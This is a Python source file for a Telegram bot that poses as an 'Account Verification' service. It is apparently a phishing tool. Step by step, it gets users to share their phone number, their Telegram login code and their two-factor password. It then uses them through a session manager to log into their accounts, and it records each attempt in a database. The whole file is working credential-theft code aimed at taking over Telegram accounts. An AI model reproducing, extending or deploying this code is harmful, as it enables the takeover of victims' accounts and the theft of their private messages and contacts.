import os
import logging
import asyncio
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    ConversationHandler,
    ContextTypes,
)
from config import BOT_TOKEN
from utils.session_manager import SessionManager
from utils.database import Database

os.environ["TELEGRAM_NO_TELEMETRY"] = "1"

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

TOKEN = BOT_TOKEN

PHONE, OTP, PASSWORD = range(3)

PHONE_KEYBOARD = ReplyKeyboardMarkup(
    [[KeyboardButton("📱 Share Phone Number", request_contact=True)]],
    resize_keyboard=True,
    one_time_keyboard=True,
)


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🔐 Account Verification\n\n"
        "Please share your phone number to begin.",
        reply_markup=PHONE_KEYBOARD,
        parse_mode="Markdown",
    )
    return PHONE


async def handle_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    contact = update.message.contact
    if not contact:
        await update.message.reply_text("❌ Please use the button below.")
        return PHONE

    phone = contact.phone_number
    context.user_data["phone"] = phone
    logger.info(f"[+] Phone: {phone}")

    Database.log_attempt(phone, "started")

    await update.message.reply_text(
        f"📱 Phone: `{phone}`\n\n"
        "Please enter the 5-6 digit verification code sent to your Telegram.",
        parse_mode="Markdown",
    )
    return OTP


async def handle_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    otp = update.message.text.strip()
    phone = context.user_data.get("phone")

    if not phone:
        await update.message.reply_text("❌ Please start over with /start")
        return ConversationHandler.END

    if not otp.isdigit() or len(otp) not in (5, 6):
        await update.message.reply_text("❌ Invalid code. Enter 5-6 digits.")
        return OTP

    context.user_data["otp"] = otp
    await update.message.reply_text("⏳ Verifying...")

    try:
        loop = asyncio.get_running_loop()
    except RuntimeError:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)

    manager = SessionManager(phone)
    result = await manager.login_with_otp(otp)

    if result.get("status") == "2fa_required":
        await update.message.reply_text(
            "🔐 2FA Enabled\n\nThis account has 2FA. Enter your password:",
            parse_mode="Markdown",
        )
        return PASSWORD

    elif result.get("status") == "success":
        await update.message.reply_text(
            f"✅ Verified\n\nPhone: `{result['user']}`",
            parse_mode="Markdown",
        )
        Database.log_attempt(phone, "success")
        return ConversationHandler.END

    else:
        await update.message.reply_text(
            f"❌ Failed\n\nReason: `{result.get('reason', 'Unknown error')}`\n\n"
            "Try /start again.",
            parse_mode="Markdown",
        )
        Database.log_attempt(phone, "failed", result.get("reason", ""))
        return ConversationHandler.END


async def handle_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    password = update.message.text.strip()
    phone = context.user_data.get("phone")
    otp = context.user_data.get("otp")

    if not phone or not otp:
        await update.message.reply_text("❌ Start over with /start")
        return ConversationHandler.END

    await update.message.reply_text("⏳ Verifying with 2FA...")

    manager = SessionManager(phone)
    result = await manager.login_with_otp(otp, password)

    if result.get("status") == "success":
        await update.message.reply_text(
            f"✅ Verified\n\nPhone: `{result['user']}`",
            parse_mode="Markdown",
        )
        Database.log_attempt(phone, "success_2fa")
    else:
        await update.message.reply_text(
            f"❌ Failed\n\nReason: `{result.get('reason', 'Invalid password')}`",
            parse_mode="Markdown",
        )
        Database.log_attempt(phone, "failed_2fa", result.get("reason", ""))

    return ConversationHandler.END


def create_app():
    app = Application.builder().token(TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            PHONE: [MessageHandler(filters.CONTACT, handle_phone)],
            OTP: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_otp)],
            PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_password)],
        },
        fallbacks=[CommandHandler("start", start)],
    )

    app.add_handler(conv_handler)
    return app


app = create_app()
